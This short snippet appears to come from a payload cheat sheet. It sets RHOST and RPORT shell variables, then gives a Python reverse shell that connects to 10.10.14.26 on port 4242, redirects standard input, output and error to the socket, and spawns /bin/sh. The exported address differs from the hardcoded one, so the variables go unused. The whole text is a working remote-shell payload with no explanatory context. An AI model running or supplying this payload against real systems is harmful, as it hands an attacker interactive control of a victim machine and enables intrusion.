export RHOST="10.0.0.1"
export RPORT=4242

import sys,socket,os,pty
s=socket.socket()
s.connect(('10.10.14.26',int(4242)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")